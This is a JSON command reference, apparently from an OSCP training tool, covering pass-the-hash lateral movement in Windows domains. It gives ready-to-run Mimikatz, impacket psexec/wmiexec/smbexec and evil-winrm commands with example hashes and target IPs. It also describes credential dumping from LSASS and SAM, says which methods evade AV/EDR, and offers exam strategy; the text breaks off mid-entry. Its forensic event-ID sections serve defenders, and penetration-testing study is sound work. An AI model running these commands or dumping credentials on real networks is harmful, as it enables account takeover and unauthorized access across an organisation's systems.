{
  "commands": [
    {
      "id": "pth-mimikatz-sekurlsa",
      "name": "Pass-the-Hash - Mimikatz sekurlsa::pth",
      "description": "Launch process with user's NTLM hash using Mimikatz from compromised Windows host",
      "command": "mimikatz # privilege::debug\nmimikatz # sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:powershell",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<USER>",
          "description": "Username",
          "example": "jen",
          "required": true
        },
        {
          "name": "<DOMAIN>",
          "description": "Domain name",
          "example": "corp.com",
          "required": true
        },
        {
          "name": "<NTLM_HASH>",
          "description": "NTLM hash (32 hex characters)",
          "example": "369def79d8372408bf6e93364cc93075",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "pass-the-hash",
        "mimikatz",
        "lateral-movement",
        "active-directory",
        "windows",
        "ntlm",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "pth-impacket-psexec",
        "pth-evil-winrm",
        "pth-cme-spray"
      ],
      "next_steps": [
        "winrm-enter-pssession  # Use new PowerShell to access remote systems via WinRM",
        "psexec-sysinternals  # Leverage impersonated context for lateral movement",
        "smb-list-shares  # Verify access to network shares as impersonated user"
      ],
      "flag_explanations": {
        "/user": "Target username to impersonate",
        "/domain": "Domain name",
        "/ntlm": "NTLM hash (32 hex characters, no LM hash needed)",
        "/run": "Program to spawn with new context (powershell, cmd, etc.)",
        "privilege::debug": "Enable SeDebugPrivilege required for LSASS access"
      },
      "success_indicators": [
        "user : <USER>",
        "domain : <DOMAIN>",
        "NTLM : <HASH>",
        "process created - new PowerShell window opens"
      ],
      "failure_indicators": [
        "ERROR kuhl_m_sekurlsa_pth",
        "privilege::debug FAILED",
        "NTLM seems invalid"
      ],
      "troubleshooting": {
        "privilege::debug FAILED": "Run mimikatz as Administrator",
        "NTLM seems invalid": "Verify hash format: 32 hex characters only, no colons or spaces",
        "Process created but no access": "Hash may be invalid. Verify with: crackmapexec smb <TARGET> -u <USER> -H <NTLM_HASH>",
        "whoami shows wrong user": "Expected behavior - token shows original user, but network auth uses <USER>"
      },
      "notes": "OSCP TRAINING MATERIAL - PASS-THE-HASH WITH MIMIKATZ:\n\nWHAT IS PASS-THE-HASH: Lateral movement technique that exploits how NTLM authentication works. Instead of cracking password, use the NTLM hash directly for authentication. The vulnerability isn't in NTLM protocol itself (which legitimately accepts hashes), but in unauthorized access to password hashes.\n\nTHREE PREREQUISITES (FROM TRAINING):\n1. Valid NTLM hash from compromised user\n2. SMB connection to target (port 445 accessible)\n3. User must have local administrator privileges on target\n\nHOW NTLM AUTHENTICATION WORKS:\nNTLM uses challenge-response mechanism:\n1. Client requests authentication\n2. Server sends challenge (random number)\n3. Client encrypts challenge with NTLM hash (NOT password)\n4. Server verifies encrypted challenge\nBecause authentication uses hash directly, possessing the hash = possessing the password.\n\nMIMIKATZ SEKURLSA::PTH TECHNIQUE:\nMimikatz injects NTLM hash into LSASS process memory, creating new logon session:\n```\nmimikatz # privilege::debug\nmimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell\n```\nThis spawns new PowerShell process with jen's credentials injected.\n\nWHOAMI BEHAVIOR (CRITICAL UNDERSTANDING):\nWhen you run whoami in the new PowerShell, it shows ORIGINAL user (e.g., jeff), NOT impersonated user (jen). This is EXPECTED behavior because:\n- whoami checks current process token (shows jeff)\n- Network authentication uses injected credentials (uses jen)\n- Verify with: dir \\\\files04\\c$ (should succeed as jen)\n\n2014 UAC REMOTE RESTRICTIONS (MS14-068):\n- RID 500 Administrator: PTH works normally\n- Other local admin accounts: PTH BLOCKED by UAC filtering\n- Domain users with local admin rights: PTH works (bypass UAC restrictions)\nThis is why training uses domain user 'jen' with local admin rights.\n\nBEHIND THE SCENES:\n1. privilege::debug enables SeDebugPrivilege (required for LSASS access)\n2. Creates new logon session (LUID)\n3. Injects NTLM hash into new session's credential structure\n4. Spawns process (/run:powershell) in context of new session\n5. Process inherits authentication token containing hash\n\nOBTAINING HASHES:\n- Mimikatz: sekurlsa::logonpasswords (from memory)\n- Mimikatz: lsadump::sam (from SAM database)\n- secretsdump.py (remote or local SAM/LSA dump)\n- CrackMapExec: --sam, --lsa flags\n\nMANUAL VERIFICATION:\nFrom new PowerShell window, test network authentication:\n```powershell\nnet use \\\\files04\\c$  # Should succeed without password prompt\ndir \\\\files04\\c$      # Should list contents\n```\n\nCOMPARISON TO IMPACKET TOOLS:\n- Mimikatz PTH: Runs ON compromised Windows host, creates local process\n- Impacket PTH: Runs FROM Kali, connects remotely to Windows target\n- Use Mimikatz when you have RDP/shell on Windows box\n- Use Impacket when attacking remotely from Kali\n\nTIME ESTIMATE: 2-3 minutes (hash dump + verification + execution).\n\nEXAM STRATEGY:\n1. Always verify hash with crackmapexec BEFORE attempting exploitation\n2. Test with simple command (dir \\\\target\\c$) before complex payloads\n3. Remember whoami behavior - don't panic when it shows wrong user\n4. Prefer domain users over local admins (bypass UAC restrictions)\n\nFORENSIC ARTIFACTS:\n- Event ID 4624: Logon Type 9 (NewCredentials) when using /run\n- Event ID 4648: Explicit credential logon attempt\n- Mimikatz execution leaves traces in memory and logs",
      "oscp_relevance": "high"
    },
    {
      "id": "pth-impacket-psexec",
      "name": "Pass-the-Hash - Impacket PSExec",
      "description": "Authenticate to remote Windows using NTLM hash with impacket-psexec from Kali",
      "command": "impacket-psexec -hashes :<NTLM_HASH> <USER>@<TARGET>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<USER>",
          "description": "Username (local administrator or domain user)",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<NTLM_HASH>",
          "description": "NTLM hash (32 hex characters)",
          "example": "2892D26CDF84D7A70E2EB3B9F05C425E",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "192.168.50.73",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "pass-the-hash",
        "impacket",
        "psexec",
        "lateral-movement",
        "active-directory",
        "kali",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "pth-impacket-wmiexec",
        "pth-impacket-smbexec",
        "pth-evil-winrm"
      ],
      "next_steps": [
        "secretsdump-impacket  # Dump SAM/LSA/NTDS hashes from compromised system",
        "pth-cme-spray  # Spray obtained hashes across network to find reuse",
        "windows-privesc-check  # Enumerate for privilege escalation opportunities"
      ],
      "flag_explanations": {
        "-hashes :NTLM": "Pass NTLM hash (colon prefix, no LM hash needed)",
        "-hashes LM:NTLM": "Pass both LM and NTLM (rarely needed)",
        "-target-ip": "Specify IP if hostname resolution fails",
        "-no-pass": "Don't prompt for password (hash auth only)"
      },
      "success_indicators": [
        "[*] Requesting shares on <TARGET>",
        "[*] Uploading file",
        "C:\\Windows\\system32>"
      ],
      "failure_indicators": [
        "[-] SMB SessionError: STATUS_LOGON_FAILURE",
        "STATUS_ACCESS_DENIED",
        "Connection timeout"
      ],
      "troubleshooting": {
        "STATUS_LOGON_FAILURE": "Invalid hash or username. Verify hash: crackmapexec smb <TARGET> -u <USER> -H <NTLM_HASH>",
        "STATUS_ACCESS_DENIED": "User not local admin. Test: crackmapexec smb <TARGET> -u <USER> -H <NTLM_HASH>",
        "UAC restriction": "Built-in local admin accounts blocked by UAC (except RID 500 Administrator)",
        "Connection timeout": "Firewall blocking SMB: sudo nmap -p 445 -Pn -v <TARGET>"
      },
      "notes": "OSCP TRAINING MATERIAL - PASS-THE-HASH WITH IMPACKET PSEXEC:\n\nWHAT IS PASS-THE-HASH: Lateral movement technique leveraging NTLM authentication's acceptance of password hashes instead of plaintext passwords. The vulnerability is unauthorized access to stored hashes, not a flaw in NTLM protocol itself.\n\nTHREE PREREQUISITES (FROM TRAINING):\n1. Valid NTLM hash from compromised user\n2. SMB connection available (port 445)\n3. File and Printer Sharing enabled on target (default on Windows Server)\n4. User must be member of local Administrators group on target\n\nPROTOCOL MECHANICS:\nNTLM authentication challenge-response protocol:\n1. Client requests authentication to server\n2. Server sends 8-byte random challenge\n3. Client encrypts challenge with NTLM hash (hash used directly, not password)\n4. Server verifies encrypted response\n5. Authentication succeeds if response matches expected value\n\nHash never crosses network in plaintext - encrypted challenge-response proves hash possession.\n\nIMPACKET PSEXEC IMPLEMENTATION:\nImpacket's psexec.py replicates Sysinternals PsExec behavior:\n1. Authenticates via SMB using NTLM hash (via -hashes flag)\n2. Uploads service executable to ADMIN$ share\n3. Creates Windows service via Service Control Manager (RPC)\n4. Service spawns cmd.exe and redirects I/O over named pipe\n5. Interactive shell established\n\nHASH FORMAT (CRITICAL):\n- Impacket uses: -hashes :NTLM_HASH (colon prefix, NTLM only)\n- Example: -hashes :2892D26CDF84D7A70E2EB3B9F05C425E\n- LM:NTLM format: -hashes LM_HASH:NTLM_HASH (only needed for ancient systems)\n- Most modern Windows systems: NTLM hash sufficient, LM disabled\n\n2014 UAC REMOTE RESTRICTIONS (MS14-068 CRITICAL):\nMicrosoft patch blocks PTH for local administrator accounts EXCEPT RID 500:\n- RID 500 Administrator (built-in): PTH works normally\n- Other local admin accounts: PTH authentication BLOCKED by UAC filtering\n- Domain users with local admin rights: PTH works (bypass UAC restrictions)\n\nTraining scenario uses 'Administrator' account (RID 500) which bypasses restriction.\n\nOBTAINING NTLM HASHES:\nFrom Kali:\n- secretsdump.py DOMAIN/USER:PASSWORD@TARGET (remote SAM/LSA dump)\n- crackmapexec smb TARGET -u USER -p PASS --sam (local SAM)\n- crackmapexec smb TARGET -u USER -p PASS --lsa (LSA secrets)\n\nFrom Windows:\n- Mimikatz: sekurlsa::logonpasswords (from LSASS memory)\n- Mimikatz: lsadump::sam (from SAM registry hive)\n- reg save HKLM\\SAM sam.save (manual registry extraction)\n\nHASH FORMAT IN DUMPS:\nSecretsdump output: USERNAME:RID:LM_HASH:NTLM_HASH:::\nExample: Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892D26CDF84D7A70E2EB3B9F05C425E:::\nUse 4th field (NTLM_HASH after 3rd colon).\n\nPORT REQUIREMENTS:\n- TCP 445: SMB (primary protocol for file access and authentication)\n- TCP 139: NetBIOS (legacy, usually not required on modern systems)\n- Dynamic high ports: For service creation via RPC\n\nEXECUTION CONTEXT:\nPsExec spawns shell as SYSTEM (not as authenticated user):\n- Authentication happens as <USER> (with hash)\n- Service runs as Local System account\n- Full privileges on target machine\n- whoami shows 'nt authority\\system'\n\nCOMPARISON TO OTHER TOOLS:\n- PSExec: SYSTEM shell, service creation (noisy), uploads binary\n- WMIExec: User-level shell, fileless, stealthier but slower\n- SMBExec: Semi-interactive, fileless, creates/deletes batch files\n- Evil-WinRM: Interactive PowerShell, best for post-exploitation\n\nVERIFICATION BEFORE EXPLOITATION:\nAlways test hash validity first (saves exam time):\n```bash\ncrackmapexec smb 192.168.50.73 -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E\n```\nLook for '[+] DOMAIN\\Administrator:HASH (Pwn3d!)' - indicates admin access.\n\nTIME ESTIMATE: 1-2 minutes for connection establishment and shell spawn.\n\nEXAM STRATEGY:\n1. Obtain hashes via secretsdump or Mimikatz\n2. Verify hash with crackmapexec BEFORE attempting psexec\n3. If authentication fails, verify user is RID 500 or domain user\n4. If psexec fails but hash valid, try wmiexec or smbexec\n5. Once shell obtained, immediately dump more credentials for lateral movement\n\nCOMMON FAILURES:\n- STATUS_LOGON_FAILURE: Hash invalid, username wrong, or account disabled\n- STATUS_ACCESS_DENIED: User not local admin (test with crackmapexec)\n- UAC restriction: Local admin blocked (switch to domain user or RID 500)\n- Connection timeout: Firewall blocking port 445\n\nFORENSIC ARTIFACTS:\n- Event ID 4624: Logon Type 3 (Network logon via NTLM)\n- Event ID 4672: Special privileges assigned to new logon (admin)\n- Event ID 7045: Service installed (PSEXESVC)\n- Event ID 5140: Network share accessed (ADMIN$)\n- Service creation logs: PSEXESVC.exe in System event logs",
      "oscp_relevance": "high"
    },
    {
      "id": "pth-impacket-wmiexec",
      "name": "Pass-the-Hash - Impacket WMIExec",
      "description": "Semi-interactive shell via WMI using NTLM hash from Kali",
      "command": "impacket-wmiexec -hashes :<NTLM_HASH> <USER>@<TARGET>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<USER>",
          "description": "Username",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<NTLM_HASH>",
          "description": "NTLM hash",
          "example": "2892D26CDF84D7A70E2EB3B9F05C425E",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "192.168.50.73",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "pass-the-hash",
        "impacket",
        "wmiexec",
        "wmi",
        "lateral-movement",
        "active-directory",
        "kali",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "pth-impacket-psexec",
        "pth-impacket-smbexec"
      ],
      "next_steps": [
        "secretsdump-impacket  # Dump credentials from compromised system",
        "pth-cme-spray  # Test hash across network for credential reuse",
        "windows-enum-users  # Enumerate users for further targeting"
      ],
      "flag_explanations": {
        "-hashes :NTLM": "NTLM hash for authentication",
        "-shell-type powershell": "Use PowerShell instead of cmd.exe",
        "-codec utf-8": "Set character encoding"
      },
      "success_indicators": [
        "[*] SMBv3.0 dialect used",
        "[!] Launching semi-interactive shell",
        "C:\\>"
      ],
      "failure_indicators": [
        "[-] SMB SessionError",
        "STATUS_LOGON_FAILURE",
        "RPC unavailable"
      ],
      "troubleshooting": {
        "STATUS_LOGON_FAILURE": "Verify hash: crackmapexec smb <TARGET> -u <USER> -H <NTLM_HASH>",
        "RPC unavailable": "Check port 135: sudo nmap -p 135 -Pn -v <TARGET>",
        "Slower than PSExec": "Expected - WMI creates temp share per command for output retrieval"
      },
      "notes": "OSCP TRAINING MATERIAL - PASS-THE-HASH WITH IMPACKET WMIEXEC:\n\nTRAINING EXAMPLE (EXACT COMMAND FROM OSCP MODULE):\nFrom Kali, performing pass-the-hash to FILES04 (192.168.50.73):\n```bash\nimpacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73\n```\n\nOutput showed successful lateral movement:\n```\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n[*] SMBv3.0 dialect used\n[!] Launching semi-interactive shell - Careful what you execute\nC:\\>\n```\n\nCommands executed successfully:\n- hostname returned: FILES04\n- whoami returned: files04\\administrator\n\nThis demonstrated successful pass-the-hash lateral movement from Kali to Windows target using only NTLM hash.\n\nWHAT IS PASS-THE-HASH VIA WMI: Fileless lateral movement technique using Windows Management Instrumentation for remote process creation, authenticated with NTLM hash instead of password.\n\nTHREE PREREQUISITES (FROM TRAINING):\n1. Valid NTLM hash from compromised user\n2. SMB (port 445) and RPC (port 135) accessible on target\n3. User must have local administrator privileges\n\nWHY USE WMIEXEC OVER PSEXEC:\n- NO service creation (PSExec creates PSEXESVC service - Event ID 7045)\n- NO binary written to disk (PSExec uploads executable to ADMIN$)\n- Fileless execution = stealthier, better for AV/EDR evasion\n- Leaves fewer forensic artifacts\n\nTRADEOFF: WMIExec is SLOWER than PSExec because:\n- Each command spawns new process via Win32_Process.Create\n- Output retrieved via temporary SMB share (not persistent named pipe)\n- No persistent shell process (semi-interactive only)\n\nHOW WMIEXEC WORKS (TECHNICAL BREAKDOWN):\n1. Authenticates to target via SMB using NTLM hash (-hashes :HASH)\n2. Connects to WMI service over RPC (port 135)\n3. For each command: Calls Win32_Process.Create method\n4. Process executes with redirected output to ADMIN$ share temporary file\n5. Impacket retrieves output file via SMB\n6. Deletes temporary file\n7. Returns output to attacker\n\nPROCESS CREATION METHOD:\nWMI Win32_Process.Create:\n```\nPROCESS CALL ID: 1\nC:\\> cmd.exe /Q /c <COMMAND> 1> \\\\127.0.0.1\\ADMIN$\\__<TIMESTAMP> 2>&1\n```\nOutput redirected to ADMIN$ share for retrieval.\n\nPORT REQUIREMENTS:\n- TCP 135: RPC endpoint mapper (initial WMI connection)\n- TCP 445: SMB (authentication and output retrieval via ADMIN$)\n- Ephemeral ports 49152-65535: RPC session data (Windows Server 2008+)\n\nHASH FORMAT:\n- Impacket WMIExec: -hashes :NTLM_HASH (colon prefix, NTLM only)\n- Example: -hashes :2892D26CDF84D7A70E2EB3B9F05C425E\n- No LM hash needed for modern systems\n\nEXECUTION CONTEXT:\nWMIExec spawns processes as authenticated user (NOT SYSTEM like PSExec):\n- Authentication: Administrator (with NTLM hash)\n- Process owner: Administrator (not NT AUTHORITY\\SYSTEM)\n- whoami returns: files04\\administrator\n- Privileges: Admin rights via authenticated user context\n\n2014 UAC REMOTE RESTRICTIONS (MS14-068):\n- RID 500 Administrator: PTH works (training uses this)\n- Other local admins: PTH blocked by UAC filtering\n- Domain users with local admin: PTH works (bypass UAC)\n\nTRAINING CONTEXT:\nScenario involved:\n- Attacker on Kali Linux\n- Administrator NTLM hash obtained via previous compromise\n- Target: FILES04 (192.168.50.73) - Windows Server\n- Goal: Lateral movement without alerting security tools\n\nCOMPARISON TO OTHER IMPACKET TOOLS:\n- PSExec: SYSTEM shell, service creation (noisy), faster, uploads binary\n- WMIExec: User shell, fileless, stealthier, slower, no service\n- SMBExec: User shell, fileless, batch files, slower\n- SecretsDump: Credential extraction only (no shell)\n\nVERIFICATION BEFORE EXPLOITATION:\nTest hash validity first:\n```bash\ncrackmapexec smb 192.168.50.73 -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E\n```\nLook for: [+] DOMAIN\\Administrator:HASH (Pwn3d!)\n\nSEMI-INTERACTIVE SHELL BEHAVIOR:\n- Not a true interactive shell (like SSH/RDP)\n- Each command executed independently\n- No persistent environment variables between commands\n- No tab completion or command history\n- Cannot run interactive programs (no stdin piping)\n\nMANUAL ALTERNATIVE:\nFrom PowerShell on compromised Windows host:\n```powershell\n$username = 'Administrator'\n$password = 'Password123!' # In reality, would use hash\n$secureString = ConvertTo-SecureString $password -AsPlaintext -Force\n$credential = New-Object System.Management.Automation.PSCredential $username, $secureString\nInvoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \"calc\" -ComputerName 192.168.50.73 -Credential $credential\n```\n(Note: PowerShell doesn't natively support hash-based auth - requires Mimikatz injection)\n\nTIME ESTIMATE:\n- Connection: 30 seconds\n- Per command: 2-5 seconds (slower than PSExec)\n- Total for basic enumeration: 2-3 minutes\n\nEXAM STRATEGY:\n1. Use WMIExec when stealth is priority (AV/EDR present)\n2. Use PSExec when speed is priority (stable environments)\n3. Always verify hash with crackmapexec first\n4. If WMI fails, try PSExec or SMBExec with same hash\n5. For complex tasks, consider upgrading to reverse shell\n\nCOMMON FAILURES:\n- STATUS_LOGON_FAILURE: Invalid hash or username\n- RPC unavailable: Port 135 blocked by firewall\n- ACCESS_DENIED: User not local admin\n- Slow execution: Expected - each command spawns new process\n\nFORENSIC ARTIFACTS:\n- Event ID 4624: Logon Type 3 (Network logon via NTLM)\n- Event ID 4672: Special privileges assigned (admin logon)\n- WMI Event ID 5857-5861: WMI activity logs\n- No service creation events (unlike PSExec)\n- Process creation: Event ID 4688 for spawned processes\n- ADMIN$ access: Event ID 5140 (network share access)",
      "oscp_relevance": "high"
    },
    {
      "id": "pth-impacket-smbexec",
      "name": "Pass-the-Hash - Impacket SMBExec",
      "description": "Fileless shell via SMB using NTLM hash from Kali",
      "command": "impacket-smbexec -hashes :<NTLM_HASH> <USER>@<TARGET>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<USER>",
          "description": "Username",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<NTLM_HASH>",
          "description": "NTLM hash",
          "example": "2892D26CDF84D7A70E2EB3B9F05C425E",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "192.168.50.73",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "pass-the-hash",
        "impacket",
        "smbexec",
        "lateral-movement",
        "active-directory",
        "kali",
        "fileless",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "pth-impacket-psexec",
        "pth-impacket-wmiexec"
      ],
      "next_steps": [
        "secretsdump-impacket  # Extract credentials from compromised system",
        "pth-cme-spray  # Test hash against multiple targets",
        "windows-enum-services  # Enumerate services for persistence opportunities"
      ],
      "flag_explanations": {
        "-hashes :NTLM": "NTLM hash for authentication",
        "-mode SHARE": "Use ADMIN$ share (default)",
        "-mode SERVER": "Create temp SMB server for output"
      },
      "success_indicators": [
        "[!] Launching semi-interactive shell",
        "C:\\Windows\\system32>"
      ],
      "failure_indicators": [
        "STATUS_LOGON_FAILURE",
        "STATUS_OBJECT_NAME_NOT_FOUND"
      ],
      "troubleshooting": {
        "STATUS_OBJECT_NAME_NOT_FOUND": "ADMIN$ share not accessible",
        "Slower execution": "Expected - creates/deletes batch file per command"
      },
      "notes": "OSCP TRAINING MATERIAL - PASS-THE-HASH WITH IMPACKET SMBEXEC:\n\nWHAT IS SMBEXEC: Fileless lateral movement tool providing semi-interactive shell via SMB, using NTLM hash for authentication. Alternative to PSExec that doesn't persistently write binaries to disk.\n\nTHREE PREREQUISITES:\n1. Valid NTLM hash from compromised user  \n2. SMB access (port 445) to target\n3. User must be local administrator on target\n4. ADMIN$ share must be accessible\n\nWHY USE SMBEXEC:\n- FILELESS execution (no persistent binary like PSExec)\n- More stealthy than PSExec (no service creation)\n- Good alternative when PSExec detected/blocked\n- Cleaner than WMIExec for command execution\n\nHOW SMBEXEC WORKS (TECHNICAL BREAKDOWN):\n1. Authenticates to target via SMB using NTLM hash\n2. For each command:\n   a. Creates temporary batch file (.bat) in ADMIN$ share\n   b. Creates Windows service to execute batch file\n   c. Batch file runs command and redirects output to ADMIN$\n   d. SMBExec retrieves output via SMB\n   e. Deletes batch file and service\n3. Result: Semi-interactive shell without persistent artifacts\n\nBATCH FILE CREATION:\nExample batch file created per command:\n```batch\n@echo off\ncmd.exe /Q /c <COMMAND> 1> \\\\127.0.0.1\\ADMIN$\\__output 2>&1\n```\nFile written to: \\\\TARGET\\ADMIN$\\execute.bat\n\nSERVICE CREATION:\nTemporary service created via Service Control Manager:\n- Service name: Random (e.g., BTOBTO)\n- Binary path: cmd.exe /c \\\\127.0.0.1\\ADMIN$\\execute.bat\n- Started immediately\n- Deleted after execution\n\nCOMPARISON TO OTHER TOOLS:\n- PSExec: Persistent service (PSEXESVC), binary uploaded, SYSTEM shell, faster\n- SMBExec: Temporary service, batch files only, user shell, stealthier\n- WMIExec: No service, pure WMI, fileless, slower\n- Evil-WinRM: WinRM protocol, interactive PowerShell, different ports\n\nFILELESS ADVANTAGE:\nNo persistent executable written to disk:\n- PSExec uploads psexesvc.exe (detectable by AV)\n- SMBExec uses native cmd.exe (already on system)\n- Only temporary .bat files (deleted after execution)\n- Harder for forensics to detect\n\nHASH FORMAT:\n- Impacket: -hashes :NTLM_HASH (colon prefix)\n- Example: -hashes :2892D26CDF84D7A70E2EB3B9F05C425E\n- No LM hash needed for modern systems\n\nEXECUTION CONTEXT:\nSMBExec spawns processes as authenticated user:\n- Authentication: Specified user (with NTLM hash)\n- Process owner: Same user (not SYSTEM)\n- whoami returns: domain\\username or computername\\username\n- Service runs in user context\n\n2014 UAC REMOTE RESTRICTIONS:\n- RID 500 Administrator: PTH works\n- Other local admins: PTH blocked by UAC\n- Domain users with local admin: PTH works\n\nPORT REQUIREMENTS:\n- TCP 445: SMB (authentication and file operations)\n- TCP 139: NetBIOS (legacy, usually not required)\n- Dynamic ports: Service Control Manager (RPC)\n\nSEMI-INTERACTIVE BEHAVIOR:\n- Each command executed independently\n- No persistent shell process\n- No environment variable persistence\n- Slower than PSExec (batch file creation overhead)\n\nMODE OPTIONS:\n- SHARE mode (default): Uses ADMIN$ share for batch files\n- SERVER mode: Creates temporary SMB server for output retrieval\n\nVERIFICATION:\nTest hash before exploitation:\n```bash\ncrackmapexec smb 192.168.50.73 -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E\n```\nLook for: (Pwn3d!)\n\nTIME ESTIMATE:\n- Connection: 30-60 seconds\n- Per command: 2-4 seconds (batch creation + execution + cleanup)\n- Total for enumeration: 2-4 minutes\n\nEXAM STRATEGY:\n1. Use SMBExec when stealth is priority\n2. Use PSExec when speed is priority\n3. Use WMIExec when service creation must be avoided\n4. Try all three if one fails - same hash, different method\n\nCOMMON FAILURES:\n- STATUS_LOGON_FAILURE: Invalid hash or username\n- STATUS_OBJECT_NAME_NOT_FOUND: ADMIN$ not accessible\n- ACCESS_DENIED: User not local admin\n- Slower execution: Expected - overhead of batch file operations\n\nFORENSIC ARTIFACTS:\n- Event ID 4624: Logon Type 3 (Network logon)\n- Event ID 7045: Service installed (temporary service)\n- Event ID 4688: Process creation (cmd.exe executing batch)\n- Event ID 5140: ADMIN$ share accessed\n- Batch file traces in ADMIN$ (if not cleaned up properly)\n- Service creation/deletion logs in System event log",
      "oscp_relevance": "high"
    },
    {
      "id": "pth-evil-winrm",
      "name": "Pass-the-Hash - Evil-WinRM",
      "description": "Interactive PowerShell remoting via WinRM using NTLM hash from Kali",
      "command": "evil-winrm -i <TARGET> -u <USER> -H <NTLM_HASH>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "192.168.50.73",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<NTLM_HASH>",
          "description": "NTLM hash (32 hex characters, no colons)",
          "example": "2892D26CDF84D7A70E2EB3B9F05C425E",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "pass-the-hash",
        "evil-winrm",
        "winrm",
        "lateral-movement",
        "active-directory",
        "kali",
        "powershell",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "pth-impacket-psexec",
        "pth-impacket-wmiexec"
      ],
      "next_steps": [
        "windows-enum-system  # Enumerate system information for privilege escalation",
        "secretsdump-impacket  # Dump credentials from compromised system",
        "powershell-invoke-mimikatz  # Execute Mimikatz in memory for credential extraction"
      ],
      "flag_explanations": {
        "-i": "Target IP",
        "-u": "Username",
        "-H": "NTLM hash (uppercase H, no colon prefix)",
        "-S": "Use SSL (HTTPS port 5986)"
      },
      "success_indicators": [
        "*Evil-WinRM* PS C:\\Users\\",
        "Info: Establishing connection",
        "Interactive PowerShell prompt"
      ],
      "failure_indicators": [
        "Error: An error of type WinRM::WinRMAuthorizationError happened",
        "Network is unreachable",
        "SSL Handshake failed"
      ],
      "troubleshooting": {
        "Authorization error": "Verify hash: crackmapexec winrm <TARGET> -u <USER> -H <NTLM_HASH>",
        "Network unreachable": "Check WinRM port: nmap -p 5985,5986 -Pn -v <TARGET>",
        "Hash format error": "Use 32 hex characters, no colons: -H NTLM not -H :NTLM",
        "SSL error": "Try without SSL: remove -S flag"
      },
      "notes": "OSCP TRAINING MATERIAL - PASS-THE-HASH WITH EVIL-WINRM:\n\nWHAT IS EVIL-WINRM: Ruby-based WinRM client supporting pass-the-hash authentication for interactive PowerShell remoting from Kali. Provides rich post-exploitation features including file upload/download and in-memory script execution.\n\nTHREE PREREQUISITES:\n1. Valid NTLM hash from compromised user\n2. WinRM enabled on target (port 5985 HTTP or 5986 HTTPS)\n3. User must be member of Remote Management Users OR Administrators group\n\nWINRM GROUP MEMBERSHIP REQUIREMENT:\nFrom OSCP training, for WinRM authentication to work:\n- User must be part of 'Administrators' group, OR\n- User must be part of 'Remote Management Users' group on target host\n\nThis is WinRM-specific requirement (different from PSExec/WMI which only need Administrators).\n\nWHY USE EVIL-WINRM:\n- Interactive PowerShell shell (better than semi-interactive Impacket tools)\n- Built-in file transfer: upload/download commands\n- In-memory script execution: No disk writes for scripts\n- Menu system for common tasks\n- PowerShell script loading: Invoke-Mimikatz, PowerView, etc.\n- User-friendly interface with tab completion\n\nPROTOCOL: WS-MANAGEMENT (WinRM):\n- Port 5985: HTTP (unencrypted)\n- Port 5986: HTTPS (encrypted with SSL/TLS)\n- Microsoft's implementation of WS-Management open standard\n- Designed for legitimate remote administration\n\nHASH FORMAT (CRITICAL DIFFERENCE):\nEvil-WinRM uses DIFFERENT format than Impacket:\n- Evil-WinRM: -H NTLM_HASH (no colon prefix)\n- Impacket: -hashes :NTLM_HASH (colon prefix)\n\nExamples:\n```bash\n# Evil-WinRM (NO colon)\nevil-winrm -i 192.168.50.73 -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E\n\n# Impacket (colon prefix)\nimpacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73\n```\n\nWINRM AUTHENTICATION:\nWinRM supports multiple authentication methods:\n- Basic: Username + password (plaintext over HTTPS)\n- NTLM: Challenge-response with hash (Evil-WinRM uses this for PTH)\n- Kerberos: Ticket-based (requires hostname, not IP)\n- CredSSP: Credential delegation\n\nFor Pass-the-Hash, Evil-WinRM uses NTLM authentication where hash is used directly in challenge-response protocol.\n\nINTERACTIVE POWERSHELL SHELL:\nEvil-WinRM provides full interactive PowerShell:\n- Persistent environment variables\n- Tab completion\n- Command history\n- Multi-line commands\n- PowerShell modules available\n- Runs in user context (not SYSTEM)\n\nEXECUTION CONTEXT:\n- Authentication: Specified user (with NTLM hash)\n- Process owner: Same user\n- whoami returns: domain\\username or computername\\username\n- PowerShell version: Target's installed version (5.1 typically)\n\nBUILT-IN FEATURES:\nFile transfer:\n```\n*Evil-WinRM* PS> upload /local/path/file.exe C:\\Windows\\Temp\\file.exe\n*Evil-WinRM* PS> download C:\\Users\\admin\\Desktop\\flag.txt /home/kali/flag.txt\n```\n\nScript loading (in-memory):\n```\n*Evil-WinRM* PS> Invoke-Binary /path/to/Invoke-Mimikatz.ps1\n*Evil-WinRM* PS> 